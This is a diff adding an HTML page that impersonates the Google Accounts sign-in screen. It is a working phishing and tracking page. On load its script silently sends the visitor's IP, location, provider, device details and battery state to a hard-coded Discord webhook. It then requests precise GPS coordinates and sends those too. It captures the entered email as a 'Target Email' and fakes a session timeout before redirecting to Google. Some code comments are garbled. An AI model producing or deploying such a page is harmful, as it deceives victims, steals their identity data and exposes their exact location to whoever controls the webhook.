@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px 0; color: #202124; }
+        p { margin-bottom: 30px; color: #202124; font-size: 16px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
+        .footer-text { text-align: left; font-size: 14px; color: #5f6368; margin-top: 30px; line-height: 1.4; }
+    </style>
+</head>
+<body onload="initTracker()">
+
+    <div class="box">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google" class="logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <input type="email" id="targetEmail" placeholder="Email or phone">
+        <div class="footer-text">
+            Not your computer? Use Guest mode to sign in privately.
+        </div>
+        <button onclick="manualSubmit()">Next</button>
+    </div>
+
+    <script>
+        // *** CONFIGURATION ***
+        const webhookURL = "https://discord.com/api/webhooks/1462774752824262688/ilWEBKfwN1Y2lyWkJ3tkYE1GqUGlJxLQcst24ITvn_Kjkp_zecR9SNYkBwF4TfJnok40";
+
+        // 1. ????????????????????: ???????????????? (IP, Battery, Device)
+        async function initTracker() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                let batteryStatus = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+                }
+
+                await postToDiscord({
+                    title: "System Log: Basic Info (Auto-Detected)",
+                    color: 3066993,
+                    fields: [
+                        { name: "IP Address", value: `\`${ipData.ip}\`` },
+                        { name: "Location (IP)", value: `${ipData.city}, ${ipData.country_name}` },
+                        { name: "Provider", value: ipData.org },
+                        { name: "Battery", value: batteryStatus, inline: true },
+                        { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "User-Agent", value: `\`${navigator.userAgent.substring(0, 150)}\`` }
+                    ]
+                });
+
+                // ?? GPS ????????
+                requestGPS();
+            } catch (e) { console.error(e); }
+        }
+
+        // 2. ??????? GPS (?????????????????)
+        function requestGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    await postToDiscord({
+                        title: "System Log: GPS Pinpoint (Accuracy High)",
+                        color: 15158332,
+                        description: `[Open on Google Maps](https://www.google.com/maps?q=${lat},${lon})`,
+                        fields: [
+                            { name: "Latitude/Longitude", value: `\`${lat}, ${lon}\`` },
+                            { name: "Accuracy", value: `${Math.round(pos.coords.accuracy)} meters` }
+                        ]
+                    });
+                }, null, { enableHighAccuracy: true });
+            }
+        }
+
+        // 3. ???????????????????????? Next
+        async function manualSubmit() {
+            const email = document.getElementById('targetEmail').value;
+            if (!email) { alert("Please enter an email"); return; }
+
+            await postToDiscord({
+                title: "System Log: Input Captured",
+                color: 15844367,
+                fields: [{ name: "Target Email", value: `\`${email}\`` }]
+            });
+
+            alert("Session timeout. Please sign in again.");
+            window.location.href = "https://accounts.google.com/";
+        }
+
+        // ????????????????????????? Discord
+        async function postToDiscord(embed) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{ ...embed, timestamp: new Date() }]
+                })
+            });
+        }
+    </script>
+</body>
+</html>
